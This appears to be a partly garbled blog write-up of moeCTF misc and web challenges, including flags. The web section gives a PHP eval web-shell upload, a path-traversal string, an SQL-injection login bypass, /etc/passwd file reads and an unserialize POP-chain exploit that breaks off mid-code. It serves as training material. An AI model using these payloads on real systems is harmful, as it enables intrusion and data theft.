class="markdownIt-Anchor" href="#ctfer20771"></a> ctfer2077()</h2><p><code>Do you want to get the flag?Please enjoy the video:BV1hThreMEyT BV1hThreMEyT</code><code>B</code><br /></p><h2 id="ez_usbpcap"><a class="markdownIt-Anchor" href="#ez_usbpcap"></a> ez_usbpcap()</h2><p><code>usb.src==2.1.1</code><br /><code>tshark -r xxx.pcapng -T fields -e usb.capdata | sed '/^\s*$/d' &gt; usbdata.txt</code><br /></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>: <span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;6&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;9&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">              <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;=&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;[&quot;</span>, <span class="string">&quot;30&quot;</span>: <span class="string">&quot;]&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;,&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;.&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;/&quot;</span>, <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>, <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;^&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">             <span class="string">&quot;26&quot;</span>: <span class="string">&quot;(&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;)&quot;</span>, <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;_&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;30&quot;</span>: <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;|&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;:&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;?&quot;</span>, <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>, <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&quot;usbdata.txt&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">17</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    nums.append(line[<span class="number">0</span>:<span class="number">2</span>]+line[<span class="number">4</span>:<span class="number">6</span>])</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] == <span class="string">&quot;00&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n[<span class="number">2</span>:<span class="number">4</span>] <span class="keyword">in</span> normalKeys:</span><br><span class="line">        <span class="keyword">if</span> n[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">&quot;02&quot;</span>:</span><br><span class="line">            output += shiftKeys[n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += normalKeys[n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output :\n&#x27;</span> + output)</span><br></pre></td></tr></table></figure><p></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><code>63 31 43 31 41 52 31 51 71 101</code><br /><code>hint</code><br /><code>qwe</code><code>101</code><br /><code>moectf&#123;nevergetup&#125;</code></p><h2 id="readme"><a class="markdownIt-Anchor" href="#readme"></a> readme()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"> Welcome to the veryveryveryveryveryveryveryvery simple challenge! If your terminal DO NOT support unicode, it may be messed up!</span><br><span class="line"> You got a free hint!</span><br><span class="line">--------------------------------------------------</span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">&quot;/tmp/therealflag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">the_real_flag = fd.read().strip() <span class="comment"># u can&#x27;t catch me, i am ________</span></span><br><span class="line">os.system(<span class="string">&quot;rm /tmp/therealflag&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params"><span class="built_in">input</span>, <span class="built_in">print</span></span>) -&gt; NoReturn:</span><br><span class="line">    <span class="keyword">pass</span> <span class="comment"># not implemented yet</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">pass</span> <span class="comment"># not implemented yet</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure><p></p><h2 id="300"><a class="markdownIt-Anchor" href="#300"></a> 300</h2><p><code>imagemagick</code><br /><code>3x3</code><a href="http://zuohaotu.com/image-merge.aspx">http://zuohaotu.com/image-merge.aspx</a><br /><code>gaps run ./flag.png newflag.png --generations=20 --population=200 --size=106</code><br /><code>balabalballablblablbalablbalballbase58lblblblblllblblblblbalblbdjshjshduieyrfdrpieuufghdjhgfjhdsgfsjhdgfhjdsghjgfdshjgfhjdgfhgdh///key&#123;3FgQG9ZFteHzw7W42&#125;??</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">self_encoding</span>(<span class="params">input_text</span>):</span><br><span class="line">    code_setting_first = <span class="string">&quot;doanythingfryuienbcjklmqpsw&quot;</span></span><br><span class="line">    encoded_text = <span class="string">&quot; &quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> input_text:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> code_setting_first:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(x) &lt; <span class="number">104</span>:</span><br><span class="line">                num = <span class="built_in">ord</span>(x) + <span class="number">19</span></span><br><span class="line">                x = <span class="built_in">chr</span>(num)</span><br><span class="line">                encoded_text += x + <span class="string">&quot; &quot;</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">ord</span>(x) &gt; <span class="number">115</span>:</span><br><span class="line">                num = <span class="built_in">ord</span>(x) - <span class="number">19</span></span><br><span class="line">                x = <span class="built_in">chr</span>(num)</span><br><span class="line">                encoded_text += x + <span class="string">&quot; &quot;</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="number">104</span> &lt;= <span class="built_in">ord</span>(x) &lt;= <span class="number">115</span>:</span><br><span class="line">                num = <span class="number">219</span> - <span class="built_in">ord</span>(x)</span><br><span class="line">                x = <span class="built_in">chr</span>(num)</span><br><span class="line">                encoded_text += x + <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line">    number_setting = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_text)):</span><br><span class="line">        <span class="keyword">if</span> input_text[i] <span class="keyword">in</span> number_setting:</span><br><span class="line">            <span class="keyword">if</span> i != <span class="built_in">len</span>(input_text) - <span class="number">1</span>:</span><br><span class="line">                x = <span class="built_in">int</span>(input_text[i]) ^ <span class="built_in">int</span>(input_text[i+<span class="number">1</span>])</span><br><span class="line">                encoded_text += <span class="built_in">str</span>(x) + <span class="string">&quot; &quot;</span></span><br><span class="line">            <span class="keyword">elif</span> i == <span class="built_in">len</span>(input_text) - <span class="number">1</span>:</span><br><span class="line">                encoded_text += input_text[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> encoded_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_encoding</span>(<span class="params">input_text</span>):</span><br><span class="line">    output_text = input_text[::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> output_text</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;main uu&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_text = <span class="string">&quot;blblbblblblbbl&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(reverse_encoding(self_encoding(input_text)))</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoded.txt</span></span><br><span class="line"><span class="number">7</span> <span class="number">3</span> <span class="number">5</span> d l i a h i r y</span><br><span class="line"><span class="number">6</span> <span class="number">5</span> <span class="number">1</span> d l i w m l v x h</span><br><span class="line"><span class="number">9</span> <span class="number">1</span> <span class="number">31</span> d l i w i r s a</span><br><span class="line"><span class="comment"># decode</span></span><br><span class="line">firstrow147</span><br><span class="line">secondrow236</span><br><span class="line">thirdrow589</span><br><span class="line"><span class="number">5</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">self_decoding</span>(<span class="params">input_text</span>):</span><br><span class="line">    code_setting_first = <span class="string">&quot;doanythingfryuienbcjklmqpsw&quot;</span></span><br><span class="line">    decoded_text = <span class="string">&quot; &quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> input_text:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> code_setting_first:</span><br><span class="line">            <span class="keyword">if</span> <span class="number">115</span> &lt; <span class="built_in">ord</span>(x) &lt; <span class="number">123</span>:</span><br><span class="line">                num = <span class="built_in">ord</span>(x) - <span class="number">19</span></span><br><span class="line">                x = <span class="built_in">chr</span>(num)</span><br><span class="line">                decoded_text += x</span><br><span class="line">            <span class="keyword">elif</span> <span class="number">104</span> &gt; <span class="built_in">ord</span>(x) &gt; <span class="number">96</span>:</span><br><span class="line">                num = <span class="built_in">ord</span>(x) + <span class="number">19</span></span><br><span class="line">                x = <span class="built_in">chr</span>(num)</span><br><span class="line">                decoded_text += x</span><br><span class="line">            <span class="keyword">elif</span> <span class="number">104</span> &lt;= <span class="built_in">ord</span>(x) &lt;= <span class="number">115</span>:</span><br><span class="line">                num = <span class="number">219</span> - <span class="built_in">ord</span>(x)</span><br><span class="line">                x = <span class="built_in">chr</span>(num)</span><br><span class="line">                decoded_text += x</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decoded_text</span><br></pre></td></tr></table></figure><p><code>3FgQG9ZFteHzw7W42</code><code>base58</code><code>flag</code></p><h2 id="the_secret_of_snowball"><a class="markdownIt-Anchor" href="#the_secret_of_snowball"></a> the_secret_of_snowball</h2><p><code>jpg</code><code>FF D8</code><br /><br /><code>moectf&#123;Welc0me_t0_the_secret_life_0f_Misc!&#125;</code></p><h2 id="find-it"><a class="markdownIt-Anchor" href="#find-it"></a> Find It</h2><p><code></code><code></code><br /><code>di</code><br /><code>moectf&#123;ji_di_bao_you_er_yuan&#125;</code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> ()</h2><p></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> zipfile.ZipFile(<span class="string">&#x27;C:\\Users\\27920\\Desktop\\moeCTF\\999.zip&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> myzip:</span><br><span class="line">    myzip.extractall(<span class="string">r&#x27;C:\\Users\\27920\\Desktop\\moeCTF&#x27;</span>)</span><br><span class="line">zip_directory = <span class="string">r&#x27;C:\\Users\\27920\\Desktop\\moeCTF&#x27;</span></span><br><span class="line">zip_name = <span class="string">&#x27;999.zip&#x27;</span></span><br><span class="line">zipname = zip_directory+zip_name</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_directory+<span class="string">&#x27;\\&#x27;</span>+zip_name, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> myzips:</span><br><span class="line">        ls = myzips.namelist()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;.zip&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> ls[<span class="number">0</span>]:</span><br><span class="line">            <span class="built_in">print</span>(zip_directory+<span class="string">&#x27;\\&#x27;</span>+zip_name)</span><br><span class="line">            myzips.extractall(<span class="string">r&#x27;C:\\Users\\27920\\Desktop\\moeCTF&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            myzips.extractall(<span class="string">r&#x27;C:\\Users\\27920\\Desktop\\moeCTF&#x27;</span>)</span><br><span class="line">            zip_name = <span class="built_in">str</span>(ls[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p><code>cccccccrc.zip</code><br />2()<code>CRC</code><br /><a href="https://blog.csdn.net/mochu7777777/article/details/110206427">https://blog.csdn.net/mochu7777777/article/details/110206427</a><br /><a href="https://github.com/AabyssZG/CRC32-Tools">https://github.com/AabyssZG/CRC32-Tools</a><br /><code>*m:#P7j0</code><code>flag</code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> ()</h2><p></p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2><p></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><code>/robots.txt</code><code>/webtutorEntry.php</code></p><h2 id="01-moectf"><a class="markdownIt-Anchor" href="#01-moectf"></a> 01: MoeCTF</h2><p><code>cat /flag</code><code>env</code></p><h2 id="ez_http"><a class="markdownIt-Anchor" href="#ez_http"></a> ez_http</h2><p><code>post</code><code>a=1</code><br /><code>GET POST Referer User-Agent Cookie X-Forwarded-For</code></p><h2 id="proveyourlove"><a class="markdownIt-Anchor" href="#proveyourlove"></a> ProveYourLove</h2><p><br /><code>intruder</code><code>300</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /questionnaire HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:58028</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://127.0.0.1:58028/</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 122</span><br><span class="line">Origin: http://127.0.0.1:58028</span><br><span class="line">Connection: close</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Priority: u=4</span><br><span class="line"></span><br><span class="line">&#123;&quot;nickname&quot;:&quot;HvAng1&quot;,&quot;user_gender&quot;:&quot;male&quot;,&quot;target&quot;:&quot;she&quot;,&quot;target_gender&quot;:&quot;female&quot;,&quot;message&quot;:&quot;iloveyou&quot;,&quot;anonymous&quot;:&quot;false&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!----&gt;</span><br><span class="line">&lt;!--flag1: bW9lY3Rm--&gt;</span><br><span class="line">&lt;!--/flag2hh.php--&gt;</span><br><span class="line"></span><br><span class="line">(F12)</span><br><span class="line">flag2: e0FmdEV</span><br><span class="line">nextpage: /</span><br><span class="line"></span><br><span class="line">get post cookie</span><br><span class="line">flag3: yX3RoMXN</span><br><span class="line"></span><br><span class="line">id=9</span><br><span class="line"></span><br><span class="line">flag4: fdFVUMHJ</span><br><span class="line">/flag5sxr.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">!</span><br><span class="line">flag5: fSV90aDF</span><br><span class="line"></span><br><span class="line">PHP</span><br><span class="line">flag6: rZV9VX2t</span><br><span class="line"></span><br><span class="line">system(&quot;cat /flag7&quot;);</span><br><span class="line">flag7: rbm93X1dlQn0= </span><br></pre></td></tr></table></figure><h2 id="imagecloud"><a class="markdownIt-Anchor" href="#imagecloud"></a> ImageCloud</h2><p>PHP<code>file:///etc/passwd</code></p><h2 id="02-"><a class="markdownIt-Anchor" href="#02-"></a> 02: </h2><p><code>a.php</code><br /><code>&lt;?php eval($_GET['1']);?&gt;</code><code>/flag.sh</code><code>/uploads/a.php?1=system(&quot;env&quot;);</code></p><h2 id="03-"><a class="markdownIt-Anchor" href="#03-"></a> 03: </h2><p> <code>jpg/png/gif</code> <br /><code>.php</code><br /><code>a.jpg</code><code>&lt;?php phpinfo();?&gt;</code><br /><code>/uploads/a.php</code><code>Ctrl f</code><code>moe</code></p><h2 id="04-"><a class="markdownIt-Anchor" href="#04-"></a> 04: </h2><p><br /><code>../../../../../../../../../tmp/flag</code></p><h2 id="05-"><a class="markdownIt-Anchor" href="#05-"></a> 05: </h2><p> <code>admin123</code><br /><code>admin123' or '1'='1</code></p><h2 id="06-pop-base-mini-moe"><a class="markdownIt-Anchor" href="#06-pop-base-mini-moe"></a> 06: pop base mini moe</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="comment">//  private </span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$evil</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$s</span>(<span class="variable language_">$this</span>-&gt;evil);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="variable">$s</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//  private </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evil</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span 